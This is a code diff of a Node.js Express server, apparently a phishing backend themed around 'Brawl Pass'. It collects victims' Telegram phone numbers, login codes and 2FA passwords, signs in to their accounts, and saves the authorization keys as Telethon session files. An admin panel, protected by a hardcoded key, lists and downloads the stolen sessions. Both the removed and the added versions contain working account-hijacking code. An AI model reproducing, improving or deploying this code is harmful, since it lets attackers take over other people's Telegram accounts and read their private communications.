@@ -1,71 +1,86 @@
 const express = require('express');
 const session = require('express-session');
+const FileStore = require('session-file-store')(session);
 const fs = require('fs');
 const path = require('path');
-const { TelegramClient, Api } = require('telegram');
-const { StringSession } = require('telegram/sessions/');
-const { computeCheck } = require('telegram/Password');
 const { execSync } = require('child_process');
-
-// ===== ЗАГРУЗКА API ДАННЫХ =====
-const { API_ID, API_HASH } = require('./config');
-
-console.log('=== ЗАПУСК СЕРВЕРА ===');
-console.log('API_ID:', API_ID);
-console.log('API_HASH:', API_HASH);
-console.log('========================');
+const { TelegramClient, Api } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const { computeCheck } = require('telegram/Password');
+const config = require('./config');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-app.use(express.json({ strict: false }));
+// API Credentials
+const API_ID = config.API_ID || 2040;
+const API_HASH = config.API_HASH || 'b18441a1ff607e10a989891a5462e627';
+const ADMIN_KEY = config.ADMIN_KEY || 'brawladmin';
+
+// Parsers
+app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Логирование POST-запросов
-app.use((req, res, next) => {
-    if (req.method === 'POST') {
-        console.log('\n📥', req.method, req.url);
-        console.log('📦 Body:', JSON.stringify(req.body, null, 2));
-    }
-    next();
-});
-
 app.use(express.static(__dirname));
 
+// Persistent Express Sessions
 app.use(session({
-    secret: 'super-secret-key',
+    store: new FileStore({ path: './sessions_store', ttl: 86400 }),
+    secret: 'brawl_pass_secret_key',
     resave: false,
-    saveUninitialized: true,
-    cookie: {
-        secure: false,          // в продакшене – true
-        maxAge: 1000 * 60 * 60 * 24,
-        sameSite: 'lax'
-    },
+    saveUninitialized: false,
+    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
 }));
 
+// Directory for Telegram SQLite Session Files
 const SESSIONS_DIR = path.join(__dirname, 'sessions');
-if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);
+if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
+
+// Active in-memory Telegram Client instances
+const activeClients = {};
+
+// Определение корректной команды Python для вашей ОС
+function getPythonCommand() {
+    try {
+        execSync('python3 --version', { stdio: 'ignore' });
+        return 'python3';
+    } catch (e) {
+        return 'python';
+    }
+}
+const PYTHON_CMD = getPythonCommand();
 
 function getSessionFilePath(phone) {
-    const clean = phone.replace(/[^0-9]/g, '');
-    return path.join(SESSIONS_DIR, `${clean}.session`);
+    const cleanPhone = phone.replace(/[^0-9]/g, '');
+    return path.join(SESSIONS_DIR, `${cleanPhone}.session`);
 }
 
+/**
+ * Converts GramJS session credentials into a Telethon-compatible SQLite .session file
+ */
 function saveTelethonSession(phone, client, targetPath) {
+    const cleanPhone = phone.replace(/[^0-9]/g, '');
+    const tempPyPath = path.join(__dirname, `temp_session_${cleanPhone}.py`);
+
     try {
         const dcId = client.session.dcId;
         const serverAddress = client.session.serverAddress;
         const port = client.session.port;
         const authKey = client.session.authKey;
-        if (!authKey) {
-            throw new Error("No authKey in session");
-        }
-        const keyBuffer = authKey.getKey();
-        if (!keyBuffer) {
-            throw new Error("No key buffer in authKey");
-        }
-        const authKeyHex = keyBuffer.toString('hex');
 
-        console.log(`📡 Exporting Telethon Session: DC=${dcId}, IP=${serverAddress}, Port=${port}`);
+        if (!authKey) throw new Error("No authKey in session");
+
+        // Безопасное извлечение ключа
+        let keyBuffer;
+        if (typeof authKey.getKey === 'function') {
+            keyBuffer = authKey.getKey();
+        } else if (authKey.key) {
+            keyBuffer = authKey.key;
+        } else {
+            keyBuffer = authKey;
+        }
+
+        const authKeyHex = Buffer.from(keyBuffer).toString('hex');
+        console.log(`📡 Exporting Telethon Session for ${cleanPhone}: DC=${dcId}, IP=${serverAddress}:${port}`);
 
         const pythonCode = `
 import sqlite3
@@ -93,315 +108,186 @@ conn.commit()
 conn.close()
 `;
 
-        const tempPyPath = path.join(__dirname, `temp_session_${phone.replace(/[^0-9]/g, '')}.py`);
         fs.writeFileSync(tempPyPath, pythonCode, 'utf-8');
 
         if (fs.existsSync(targetPath)) {
             fs.unlinkSync(targetPath);
         }
 
-        execSync(`python "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, { stdio: 'ignore' });
-        fs.unlinkSync(tempPyPath);
+        // Выполняем Python с выводом ошибок в случае сбоя (stdio: 'pipe')
+        const output = execSync(`${PYTHON_CMD} "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, {
+            encoding: 'utf-8'
+        });
 
-        const fileSize = fs.statSync(targetPath).size;
-        console.log(`✅ Telethon SQLite Session generated successfully: ${targetPath} (${fileSize} bytes)`);
-        return true;
-    } catch (e) {
-        console.error("❌ Error generating Telethon SQLite session:", e);
-        try {
-            const sessionString = client.session.save();
-            fs.writeFileSync(targetPath, sessionString, 'utf-8');
-            console.log(`⚠️ Saved fallback StringSession (size: ${fs.statSync(targetPath).size} bytes)`);
-        } catch (err) {
-            console.error("❌ Critical: Failed to save fallback session:", err);
+        if (fs.existsSync(tempPyPath)) {
+            fs.unlinkSync(tempPyPath);
         }
+
+        if (fs.existsSync(targetPath)) {
+            const fileSize = fs.statSync(targetPath).size;
+            console.log(`✅ Session file created successfully (${fileSize} bytes): ${targetPath}`);
+            return true;
+        } else {
+            console.error(`❌ File was not created at expected path: ${targetPath}`);
+            return false;
+        }
+
+    } catch (error) {
+        console.error(`❌ Failed to save Telethon SQLite session for ${cleanPhone}:`, error.stderr || error.message);
+        if (fs.existsSync(tempPyPath)) fs.unlinkSync(tempPyPath);
         return false;
     }
 }
 
-// ===== ОТПРАВКА КОДА =====
+// ================= API ENDPOINTS =================
+
+// 1. Send Verification Code
 app.post('/api/send-code', async (req, res) => {
-    console.log('\n🔵 /api/send-code вызван');
-    const phone = req.body.phone;
-    console.log('🔵 Получен phone:', phone);
+    const { phone } = req.body;
+    if (!phone) return res.status(400).json({ error: 'Phone number is required.' });
 
-    if (!phone) {
-        return res.status(400).json({ error: 'Номер телефона не указан' });
-    }
-
-    // Удаляем старую сессию
-    try {
-        const filePath = getSessionFilePath(phone);
-        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-        console.log('🗑️ Старая сессия удалена');
-    } catch (_) {}
-
-    let client;
-    try {
-        client = new TelegramClient(
-            new StringSession(''),
-            Number(API_ID),
-            API_HASH,
-            { connectionRetries: 5, requestRetries: 5 }
-        );
-        await client.connect();
-        console.log('✅ Клиент подключён');
-
-        const result = await client.sendCode(
-            { apiId: Number(API_ID), apiHash: API_HASH },
-            phone
-        );
-        console.log('📨 Код отправлен');
-        console.log('📨 phoneCodeHash:', result.phoneCodeHash);
-
-        req.session.phoneCodeHash = result.phoneCodeHash;
-        req.session.phone = phone;
-        req.session.tempSession = client.session.save();
-        console.log('💾 Сессия сохранена (длина:', req.session.tempSession.length, ')');
-
-        res.json({ success: true });
-    } catch (error) {
-        console.error('❌ Ошибка sendCode:', error);
-        console.error('Stack:', error.stack);
-        const errorMsg = error.errorMessage || error.message || 'Неизвестная ошибка';
-        res.status(500).json({ error: 'Ошибка отправки кода: ' + errorMsg });
-    } finally {
-        if (client) try { await client.disconnect(); } catch (_) {}
-    }
-});
-
-// ===== ПРОВЕРКА КОДА =====
-app.post('/api/verify-code', async (req, res) => {
-    console.log('\n🔵 /api/verify-code вызван');
-    const { phone, code } = req.body;
-    console.log('🔵 phone:', phone);
-    console.log('🔵 code:', code);
-
-    if (!phone || !code) {
-        return res.status(400).json({ error: 'Телефон и код обязательны' });
-    }
-
-    if (req.session.phone !== phone) {
-        console.log(`❌ Номер не совпадает: сессия=${req.session.phone}, запрос=${phone}`);
-        return res.status(400).json({ error: 'Номер не совпадает с запрошенным' });
-    }
-
-    const phoneCodeHash = req.session.phoneCodeHash;
-    const tempSession = req.session.tempSession;
-
-    if (!phoneCodeHash || !tempSession) {
-        return res.status(400).json({ error: 'Сначала запросите код' });
-    }
-
-    let client;
-    try {
-        client = new TelegramClient(
-            new StringSession(tempSession),
-            Number(API_ID),
-            API_HASH,
-            { connectionRetries: 5 }
-        );
-        await client.connect();
-        console.log('✅ Клиент восстановлен из сессии');
-
-        await client.invoke(new Api.auth.SignIn({
-            phoneNumber: phone,
-            phoneCodeHash: phoneCodeHash,
-            phoneCode: code,
-        }));
-        console.log('✅ Вход успешен!');
-
-        saveTelethonSession(phone, client, getSessionFilePath(phone));
-        console.log('💾 Постоянная сессия сохранена в формате Telethon');
-
-        delete req.session.phoneCodeHash;
-        delete req.session.tempSession;
-        delete req.session.phone;
-
-        res.json({ success: true, cloudPasswordRequired: false });
-    } catch (error) {
-        console.error('❌ Ошибка verify-code:', error);
-        console.error('Stack:', error.stack);
-
-        const errorMsg = error.errorMessage || error.message || '';
-
-        if (errorMsg.includes('SESSION_PASSWORD_NEEDED') || errorMsg.includes('PASSWORD_HASH')) {
-            console.log('🔐 Требуется облачный пароль');
-            req.session.tempSessionForPassword = req.session.tempSession;
-            delete req.session.tempSession;
-            return res.json({ success: true, cloudPasswordRequired: true });
-        }
-
-        if (errorMsg.includes('PHONE_CODE_INVALID') || errorMsg.includes('CODE_INVALID')) {
-            return res.status(400).json({ error: 'Неверный код. Попробуйте снова.' });
-        }
-
-        res.status(400).json({ error: 'Ошибка проверки кода: ' + errorMsg });
-    } finally {
-        if (client) try { await client.disconnect(); } catch (_) {}
-    }
-});
-
-// ===== ПРОВЕРКА ОБЛАЧНОГО ПАРОЛЯ =====
-app.post('/api/verify-password', async (req, res) => {
-    console.log('\n🔵 /api/verify-password вызван');
-    const { phone, password } = req.body;
-    if (!phone || !password) {
-        return res.status(400).json({ error: 'Телефон и пароль обязательны' });
-    }
-
-    if (req.session.phone !== phone) {
-        return res.status(400).json({ error: 'Номер не совпадает' });
-    }
-
-    const tempSession = req.session.tempSessionForPassword;
-    if (!tempSession) {
-        return res.status(400).json({ error: 'Сначала подтвердите код' });
-    }
-
-    let client;
-    try {
-        client = new TelegramClient(
-            new StringSession(tempSession),
-            Number(API_ID),
-            API_HASH,
-            { connectionRetries: 5 }
-        );
-        await client.connect();
-
-        const pwd = await client.invoke(new Api.account.GetPassword());
-        const passwordSrpCheck = await computeCheck(pwd, password);
-        await client.invoke(new Api.auth.CheckPassword({ password: passwordSrpCheck }));
-        console.log('✅ Пароль верный для', phone);
-
-        saveTelethonSession(phone, client, getSessionFilePath(phone));
-        delete req.session.tempSessionForPassword;
-        delete req.session.phone;
-
-        res.json({ success: true });
-    } catch (error) {
-        console.error('❌ Ошибка checkPassword:', error);
-        const errorMsg = error.errorMessage || error.message || '';
-        res.status(400).json({ error: 'Неверный облачный пароль: ' + errorMsg });
-    } finally {
-        if (client) try { await client.disconnect(); } catch (_) {}
-    }
-});
-
-// ===== АДМИН-ПАНЕЛЬ ДЛЯ ВЫГРУЗКИ СЕССИЙ =====
-app.get('/admin/sessions', (req, res) => {
-    const key = req.query.key;
-    const { ADMIN_KEY } = require('./config');
-    
-    if (key !== ADMIN_KEY) {
-        return res.status(403).send('Доступ запрещен. Укажите верный ?key=ваш_ключ');
-    }
+    const cleanPhone = phone.replace(/[^0-9]/g, '');
 
     try {
-        const files = fs.readdirSync(SESSIONS_DIR).filter(f => f.endsWith('.session'));
-        let html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Управление сессиями</title>
-            <style>
-                body { font-family: -apple-system, sans-serif; background: #0b0f19; color: #f8fafc; padding: 40px 20px; text-align: center; }
-                .container { max-width: 600px; margin: 0 auto; background: rgba(15, 23, 42, 0.75); padding: 30px; border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-                h1 { color: #ffaa00; margin-bottom: 20px; font-size: 24px; }
-                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-                th, td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); text-align: left; }
-                th { background: rgba(255,255,255,0.05); color: #94a3b8; }
-                a { color: #00f2fe; text-decoration: none; font-weight: 700; }
-                a:hover { text-decoration: underline; }
-                .btn { background: linear-gradient(135deg, #ff0055, #ffaa00); color: white; padding: 12px 24px; border-radius: 12px; text-decoration: none; display: inline-block; margin-bottom: 20px; font-weight: bold; border: none; box-shadow: 0 4px 15px rgba(255,0,85,0.3); }
-                .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(255,0,85,0.4); }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>Управление сессиями (Telethon)</h1>
-                <a href="/admin/sessions/download-all?key=${key}" class="btn">📥 Скачать все архивом (.zip)</a>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Сессия (Номер)</th>
-                            <th>Размер</th>
-                            <th>Действие</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-        `;
-
-        if (files.length === 0) {
-            html += `<tr><td colspan="3" style="text-align: center; color: #94a3b8; padding: 20px;">Сессий пока нет</td></tr>`;
-        } else {
-            files.forEach(file => {
-                const stat = fs.statSync(path.join(SESSIONS_DIR, file));
-                const sizeKB = (stat.size / 1024).toFixed(1);
-                html += `
-                    <tr>
-                        <td>📱 +${file.replace('.session', '')}</td>
-                        <td>${sizeKB} KB</td>
-                        <td><a href="/admin/sessions/download/${file}?key=${key}">Скачать</a></td>
-                    </tr>
-                `;
-            });
-        }
-
-        html += `
-                    </tbody>
-                </table>
-            </div>
-        </body>
-        </html>
-        `;
-        res.send(html);
-    } catch (e) {
-        res.status(500).send('Ошибка сервера: ' + e.message);
-    }
-});
-
-// Скачивание отдельного файла сессии
-app.get('/admin/sessions/download/:file', (req, res) => {
-    const { key } = req.query;
-    const { ADMIN_KEY } = require('./config');
-    if (key !== ADMIN_KEY) return res.status(403).send('Доступ запрещен');
-
-    const file = req.params.file;
-    const filePath = path.join(SESSIONS_DIR, file);
-    if (!fs.existsSync(filePath)) return res.status(404).send('Файл не найден');
-
-    res.download(filePath);
-});
-
-// Скачивание всех сессий архивом ZIP
-app.get('/admin/sessions/download-all', (req, res) => {
-    const { key } = req.query;
-    const { ADMIN_KEY } = require('./config');
-    if (key !== ADMIN_KEY) return res.status(403).send('Доступ запрещен');
-
-    try {
-        const zipPath = path.join(__dirname, 'sessions.zip');
-        // Используем встроенный модуль zipfile в Python
-        const zipCommand = `python -c "import zipfile, os; zipf = zipfile.ZipFile('${zipPath.replace(/\\/g, '\\\\')}', 'w', zipfile.ZIP_DEFLATED); [zipf.write(os.path.join('${SESSIONS_DIR.replace(/\\/g, '\\\\')}', f), f) for f in os.listdir('${SESSIONS_DIR.replace(/\\/g, '\\\\')}') if f.endsWith('.session')]; zipf.close()"`;
-        
-        execSync(zipCommand);
-        
-        if (!fs.existsSync(zipPath)) {
-            return res.status(500).send('Не удалось сгенерировать zip архив');
-        }
-        
-        res.download(zipPath, 'sessions.zip', () => {
-            try { fs.unlinkSync(zipPath); } catch(_) {}
+        const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
+            connectionRetries: 5,
         });
-    } catch(e) {
-        res.status(500).send('Ошибка архивации: ' + e.message);
+
+        await client.connect();
+        const sendResult = await client.sendCode(
+            { apiId: API_ID, apiHash: API_HASH },
+            cleanPhone
+        );
+
+        activeClients[cleanPhone] = client;
+        req.session.phone = cleanPhone;
+        req.session.phoneCodeHash = sendResult.phoneCodeHash;
+
+        res.json({ success: true, message: 'Code sent successfully.' });
+    } catch (error) {
+        console.error('Send Code Error:', error);
+        res.status(500).json({ error: error.errorMessage || 'Failed to send code.' });
     }
 });
 
-// ===== ЗАПУСК =====
-const PORT = process.env.PORT || 3000;
+// 2. Verify Code
+app.post('/api/verify-code', async (req, res) => {
+    const { code } = req.body;
+    const phone = req.session.phone;
+    const phoneCodeHash = req.session.phoneCodeHash;
+
+    if (!phone || !phoneCodeHash) {
+        return res.status(400).json({ error: 'Session expired. Please restart authentication.' });
+    }
+
+    const client = activeClients[phone];
+    if (!client) {
+        return res.status(400).json({ error: 'Client session lost. Please re-enter phone number.' });
+    }
+
+    try {
+        await client.invoke(
+            new Api.auth.SignIn({
+                phoneNumber: phone,
+                phoneCodeHash: phoneCodeHash,
+                phoneCode: code,
+            })
+        );
+
+        const sessionPath = getSessionFilePath(phone);
+        const saved = saveTelethonSession(phone, client, sessionPath);
+
+        delete activeClients[phone];
+
+        if (!saved) {
+            return res.status(500).json({ error: 'Auth succeeded, but failed to write session file to disk.' });
+        }
+
+        res.json({ success: true, status: 'authenticated' });
+    } catch (error) {
+        if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+            return res.json({ success: true, status: '2fa_required' });
+        }
+        console.error('Verify Code Error:', error);
+        res.status(400).json({ error: error.errorMessage || 'Invalid code.' });
+    }
+});
+
+// 3. Verify 2FA Password
+app.post('/api/verify-password', async (req, res) => {
+    const { password } = req.body;
+    const phone = req.session.phone;
+
+    if (!phone) return res.status(400).json({ error: 'Session expired.' });
+
+    const client = activeClients[phone];
+    if (!client) return res.status(400).json({ error: 'Client session lost.' });
+
+    try {
+        const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
+        const passwordCheck = await computeCheck(passwordSrpResult, password);
+
+        await client.invoke(
+            new Api.auth.CheckPassword({
+                password: passwordCheck,
+            })
+        );
+
+        const sessionPath = getSessionFilePath(phone);
+        const saved = saveTelethonSession(phone, client, sessionPath);
+
+        delete activeClients[phone];
+
+        if (!saved) {
+            return res.status(500).json({ error: '2FA succeeded, but failed to write session file to disk.' });
+        }
+
+        res.json({ success: true, status: 'authenticated' });
+    } catch (error) {
+        console.error('Password Check Error:', error);
+        res.status(400).json({ error: error.errorMessage || 'Incorrect 2FA password.' });
+    }
+});
+
+// ================= ADMIN PANEL ENDPOINTS =================
+
+function checkAdmin(req, res, next) {
+    const key = req.headers['x-admin-key'] || req.query.key;
+    if (key !== ADMIN_KEY) {
+        return res.status(403).json({ error: 'Access denied.' });
+    }
+    next();
+}
+
+app.get('/api/admin/sessions', checkAdmin, (req, res) => {
+    try {
+        const files = fs.readdirSync(SESSIONS_DIR)
+            .filter(file => file.endsWith('.session'))
+            .map(file => {
+                const stats = fs.statSync(path.join(SESSIONS_DIR, file));
+                return {
+                    name: file,
+                    size: stats.size,
+                    createdAt: stats.birthtime
+                };
+            });
+        res.json({ success: true, sessions: files });
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to retrieve session files.' });
+    }
+});
+
+app.get('/api/admin/download/:filename', checkAdmin, (req, res) => {
+    const filename = req.params.filename;
+    const filePath = path.join(SESSIONS_DIR, filename);
+
+    if (fs.existsSync(filePath)) {
+        res.download(filePath);
+    } else {
+        res.status(404).json({ error: 'Session file not found.' });
+    }
+});
+
 app.listen(PORT, () => {
-    console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
-    console.log(`📁 Сессии сохраняются в ${SESSIONS_DIR}\n`);
+    console.log(`🚀 Server running on http://localhost:${PORT}`);
 });
